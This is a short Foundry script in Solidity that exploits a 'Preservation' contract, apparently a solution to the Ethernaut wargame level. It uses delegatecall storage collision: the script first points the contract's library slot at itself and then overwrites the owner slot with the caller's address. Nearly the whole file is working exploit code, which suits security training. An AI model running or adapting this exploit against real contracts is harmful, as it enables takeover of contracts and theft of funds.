// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Instances/Preservation.sol";
import "lib/forge-std/src/Script.sol";
import "lib/forge-std/src/console.sol";

contract Exploit is Script {

    address public t1;
    address public t2;
    address public owner;
    Preservation target = Preservation(0x920E7d4A854521504152d0a9Cf8bc3A47fCe5b30);      

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log(target.timeZone1Library());
        target.setFirstTime(uint256(uint160(address(this))));
        console.log(target.timeZone1Library());
        target.setFirstTime(uint256(uint160(tx.origin)));
        console.log(target.owner());
        vm.stopBroadcast();
    }

    function setTime(uint _owner) public {
        owner = address(uint160(_owner));
    }

}
